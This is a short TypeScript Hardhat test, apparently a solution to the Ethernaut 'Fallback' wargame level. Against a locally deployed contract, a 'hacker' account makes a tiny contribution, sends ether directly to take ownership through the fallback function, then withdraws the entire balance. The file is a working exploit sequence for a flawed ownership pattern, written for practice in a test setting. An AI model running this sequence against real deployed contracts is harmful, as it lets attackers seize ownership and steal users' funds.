import { use, expect } from 'chai';
import { ethers, waffle } from 'hardhat';
import { Fallback } from '../dist/types';

use(waffle.solidity);
const { parseEther } = ethers.utils;

describe('Fallback', () => {
  let fallback: Fallback;

  before(async () => {
    const [deployer] = await ethers.getSigners();
    fallback = await (await ethers.getContractFactory('Fallback'))
      .connect(deployer)
      .deploy() as Fallback;

    await deployer.sendTransaction({
      to: fallback.address,
      value: parseEther('1000'),
    });
  });

  it('hack by interaction', async () => {
    const hacker = (await ethers.getSigners())[19];

    // get the ownership
    await fallback.connect(hacker).contribute({ value: parseEther('0.0001') });
    await hacker.sendTransaction({
      to: fallback.address,
      value: parseEther('0.0001'),
    });

    // drain
    await fallback.connect(hacker).withdraw();

    // expect
    expect(await fallback.owner()).to.eq(hacker.address);
    expect(await ethers.provider.getBalance(fallback.address)).to.eq(0);
  });
});
